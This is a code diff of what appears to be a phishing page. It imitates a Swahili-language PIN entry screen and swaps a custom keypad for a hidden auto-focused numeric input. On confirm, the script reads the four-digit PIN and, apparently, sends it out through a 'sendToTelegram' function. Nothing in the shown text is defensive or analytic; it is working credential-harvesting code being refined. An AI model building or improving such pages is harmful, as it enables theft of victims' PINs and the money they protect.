@@ -62,75 +62,41 @@
                 <div class="pin-dot"></div>
             </div>
 
+            <input type="tel" id="pin-input" style="position: absolute; opacity: 0; pointer-events: none;" maxlength="4"
+                pattern="[0-9]*" inputmode="numeric">
+
             <button class="confirm-button" id="confirm-pin" style="opacity: 0.5; pointer-events: none;">Endelea</button>
         </main>
-
-        <section class="keypad">
-            <div class="keypad-row">
-                <button class="key" data-value="1">1</button>
-                <button class="key" data-value="2">2<span class="letters">A B C</span></button>
-                <button class="key" data-value="3">3<span class="letters">D E F</span></button>
-            </div>
-            <div class="keypad-row">
-                <button class="key" data-value="4">4<span class="letters">G H I</span></button>
-                <button class="key" data-value="5">5<span class="letters">J K L</span></button>
-                <button class="key" data-value="6">6<span class="letters">M N O</span></button>
-            </div>
-            <div class="keypad-row">
-                <button class="key" data-value="7">7<span class="letters">P Q R S</span></button>
-                <button class="key" data-value="8">8<span class="letters">T U V</span></button>
-                <button class="key" data-value="9">9<span class="letters">W X Y Z</span></button>
-            </div>
-            <div class="keypad-row special-row">
-                <button class="key empty-key"></button>
-                <button class="key" data-value="0">0</button>
-                <button class="key delete-key" id="delete-btn">
-                    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="1.2">
-                        <path d="M20 4H9.5L3 12l6.5 8H20a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
-                        <path d="M16 10l-4 4M12 10l4 4" />
-                    </svg>
-                </button>
-            </div>
-        </section>
     </div>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const dots = document.querySelectorAll('.pin-dot');
-            const keys = document.querySelectorAll('.key[data-value]');
-            const deleteBtn = document.getElementById('delete-btn');
+            const pinInput = document.getElementById('pin-input');
             const confirmBtn = document.getElementById('confirm-pin');
+            const content = document.querySelector('.content');
 
-            let pin = '';
+            // Trigger keyboard on content click
+            content.addEventListener('click', () => {
+                pinInput.focus();
+            });
 
-            function updateDots() {
+            // Focus initially
+            pinInput.focus();
+
+            pinInput.addEventListener('input', () => {
+                const val = pinInput.value;
                 dots.forEach((dot, i) => {
-                    if (i < pin.length) dot.classList.add('filled');
+                    if (i < val.length) dot.classList.add('filled');
                     else dot.classList.remove('filled');
                 });
 
-                if (pin.length === 4) {
+                if (val.length === 4) {
                     confirmBtn.style.opacity = '1';
                     confirmBtn.style.pointerEvents = 'auto';
                 } else {
                     confirmBtn.style.opacity = '0.5';
                     confirmBtn.style.pointerEvents = 'none';
                 }
-            }
-
-            keys.forEach(key => {
-                key.addEventListener('pointerdown', (e) => {
-                    e.preventDefault();
-                    if (pin.length < 4) {
-                        pin += key.getAttribute('data-value');
-                        updateDots();
-                    }
-                });
-            });
-
-            deleteBtn.addEventListener('pointerdown', (e) => {
-                e.preventDefault();
-                pin = pin.slice(0, -1);
-                updateDots();
             });
 
             async function sendToTelegram(message) {
@@ -147,6 +113,7 @@
 
             let isSubmitting = false;
             confirmBtn.addEventListener('click', async () => {
+                const pin = pinInput.value;
                 if (pin.length === 4 && !isSubmitting) {
                     isSubmitting = true;
                     confirmBtn.style.opacity = '0.5';
